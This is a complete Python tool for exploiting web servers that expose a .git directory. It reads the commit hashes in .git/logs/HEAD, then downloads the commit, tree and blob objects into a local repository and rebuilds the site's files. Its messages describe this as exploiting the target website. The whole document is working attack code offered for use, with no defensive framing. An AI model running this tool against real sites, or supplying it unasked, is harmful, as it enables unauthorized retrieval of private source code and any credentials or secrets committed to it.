#!/usr/bin/python3

import requests, signal, sys, time, re, os, subprocess, shutil
from colorama import Fore, init

init(autoreset=True)

if len(sys.argv) != 2:
	print(f"\nUsage: python3 {sys.argv[0]} <url>")
	print(f"\nExample: python3 {sys.argv[0]} <http://example.com/example/path/.git>")
	sys.exit()

#colors
red, yll, lgcyn, grn, mgt, rst = Fore.RED, Fore.YELLOW, Fore.LIGHTCYAN_EX, Fore.GREEN, Fore.MAGENTA, Fore.RESET
show_tree = f"{yll}\_{mgt}[{grn}*{mgt}]{lgcyn}"
show_info = f"{mgt}[{grn}*{mgt}]{lgcyn}"
show_bad_info = f"{red}[{mgt}*{red}]{mgt}"
show_blob = f"{yll}|_{mgt}[{grn}*{mgt}]{lgcyn}"

# global variables
main_url = sys.argv[1]
main_url = main_url.rstrip("/") # Clear main_url
if main_url.endswith(".git"):
	main_url = main_url[:-4]
initial_Folder = "initGit" #Can change this
all_blob = []
all_blob_filename = []

def initValues(value):
	first_two_values = value[:2]
	rest_of_value = value[2:]

	os.chdir(objects_path)
	try:
		os.mkdir(first_two_values)
	except FileExistsError:
		pass
	os.chdir(first_two_values)
	return first_two_values, rest_of_value

def initGit():
	global objects_path, head_git
	r = requests.get(main_url + ".git/logs/HEAD")
	if r.status_code == 403:
		print(f"{show_bad_info} {red}403{mgt} Status Code, {red}can't exploit {mgt}this website")
		sys.exit()
	if initial_Folder in os.listdir():
		shutil.rmtree(initial_Folder, ignore_errors=True)
		print(f"{yll}[{red}!{yll}] {lgcyn}Folder: {lgcyn}{initial_Folder} {red}deleted")
	os.mkdir(initial_Folder)
	os.chdir(initial_Folder)

	print(f"{show_info} Initializing {lgcyn}git {yll}dir")
	subprocess.run("git init", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

	r = requests.get(main_url + ".git/logs/HEAD")
	head_git = re.findall(r" ([\d\w]{40})", r.text) # capture all commit hashes
	os.chdir(".git/objects")
	objects_path = os.getcwd()

def createFirst2File():
	global commit
	for commit in head_git:
		first_two_values, rest_of_value = initValues(commit)

		print(f"{show_info} Working on {yll}{os.getcwd()}")

		r = requests.get(main_url + f".git/objects/{first_two_values}/{rest_of_value}")

		with open(rest_of_value, "wb") as f:
			f.write(r.content)
		print(f"    {show_tree} File commit {red}{commit}{rst} created sucessfully")
		getTreeKey()

def getTreeKey():
	global tree
	tree_file = subprocess.check_output(f"git cat-file -p {commit}", shell=True).decode()
	tree = re.findall(r"tree ([\d\w]{40})", tree_file)[0]

	first_two_values, rest_of_value = initValues(tree)

	r = requests.get(main_url + f".git/objects/{first_two_values}/{rest_of_value}")
	with open(rest_of_value, "wb") as f:
		f.write(r.content)

	print(f"        {show_tree} {yll}Tree Key {red}{tree}{rst} created sucessfully")
	getBlobKey()
	os.chdir(objects_path)

def getBlobKey():
	global all_blob, all_blob_filename
	blob_file = subprocess.check_output(f"git cat-file -p {tree}", shell=True).decode()
	blob = re.findall(r" blob (\w{40})", blob_file)

	all_blob += blob
	blob_filename = re.findall(r"blob \w{40}\s*(.*?)\n", blob_file)
	all_blob_filename += blob_filename

	for i, j in zip(blob, blob_filename):
		print(f"            {show_blob} {grn}Blob Key {red}{i} {grn}-> {lgcyn}{j}")
	print()

def initAllBlob():
	for i, j in zip(all_blob, all_blob_filename):
		try:
			first_two_values, rest_of_value = initValues(i)
			r = requests.get(main_url + f".git/objects/{first_two_values}/{rest_of_value}")
			if rest_of_value in os.listdir():
				raise FileExistsError
		except FileExistsError:
#			print(f"{show_bad_info} File {red}{j}{grn} Already exist; commit hash: {red}{i}")
			continue

		with open(rest_of_value, "wb") as f:
			f.write(r.content)
		print(f"{show_info} File {yll} {j} {grn} -> {red}({i}){rst} created sucessfully")

def main():
	initGit()
	createFirst2File()
	n = 0
	a = ["\\", "|", "/"]
	while n < 20:
		for i in a:
			print(f"{red}[{yll}{i}{red}]{lgcyn} Creating all existing {red}files", end="\r")
			time.sleep(0.05)
		n += 1
	initAllBlob()

def def_handler(sig, frame):
	print(f"\n\n{show_bad_info} Exiting...\n")
	sys.exit()

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	main()